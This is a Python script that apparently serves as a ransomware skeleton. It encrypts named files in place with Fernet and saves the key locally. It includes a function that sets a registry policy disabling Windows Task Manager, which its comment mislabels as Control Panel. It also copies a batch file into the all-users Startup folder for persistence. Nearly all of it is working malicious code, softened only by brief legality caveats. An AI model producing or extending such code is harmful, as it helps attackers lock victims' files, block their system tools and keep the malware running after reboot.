import os
import subprocess
import shutil
from cryptography.fernet import Fernet

def generate_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    """
    Loads the key named `secret.key` from the current directory.
    """
    return open("secret.key", "rb").read()

def encrypt_file(file_path, key):
    """
    Encrypts a file
    """
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def encrypt_files(file_list):
    """
    Encrypt specified files
    """
    key = generate_key()
    for file_path in file_list:
        encrypt_file(file_path, key)

def disable_sys_config_tools():
    """
    This is a placeholder function. Disabling system configuration tools can vary between systems.
    It's crucial to understand the implications and legal aspects of doing this.
    """
    # Example: Disabling System Configuration via Windows Registry
    try:
        # Disables access to Control Panel
        subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
                        '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

def add_startup_script(script_path):
    """
    Adds a script to system startup on Windows
    """
    try:
        startup_path = os.path.join(os.environ['SYSTEMDRIVE'], os.sep, "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shutil.copy(script_path, startup_path)
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    # Files to encrypt
    files_to_encrypt = ["example_file.txt", "another_file.docx"]

    # Encrypt specified files
    encrypt_files(files_to_encrypt)

    # Disable access to system configuration tools
    # Caution: Understand the implications and ensure legality before proceeding.
    # disable_sys_config_tools()

    # Assuming there's a startup script located at "startup_script.bat"
    add_startup_script("startup_script.bat")

if __name__ == "__main__":
    main()